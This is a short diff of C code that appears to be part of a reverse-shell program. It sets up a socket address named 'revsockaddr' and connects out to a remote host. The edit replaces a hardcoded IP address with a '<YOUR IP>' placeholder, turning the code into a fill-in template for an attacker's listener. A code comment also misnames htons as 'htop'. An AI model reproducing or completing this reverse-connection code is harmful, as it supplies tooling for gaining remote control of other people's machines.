@@ -18,7 +18,7 @@ int main(void){
 
 	//htop : It converts unsigned integer to network bytes
 	revsockaddr.sin_port = htons(port);
-	revsockaddr.sin_addr.s_addr = inet_addr("172.25.160.244");
+	revsockaddr.sin_addr.s_addr = inet_addr("<YOUR IP>");
 
 	connect(sockt, (struct sockaddr *) &revsockaddr,
 	sizeof(revsockaddr));
